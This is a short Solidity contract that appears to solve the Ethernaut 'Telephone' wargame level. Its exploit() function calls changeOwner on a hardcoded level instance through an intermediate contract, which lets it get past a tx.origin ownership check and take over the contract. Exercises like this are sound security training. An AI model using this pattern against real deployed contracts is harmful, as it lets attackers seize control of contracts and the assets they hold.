// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel04.sol";

contract Tele {
    Telephone level4 = Telephone(0x9A747f1b219D2F91E93175750c79c9E135e1510A);

    function exploit() external {
        level4.changeOwner(0x52D6eFC2994ebd93c883b5dA1d32a6cae6bE105B);
    }
}
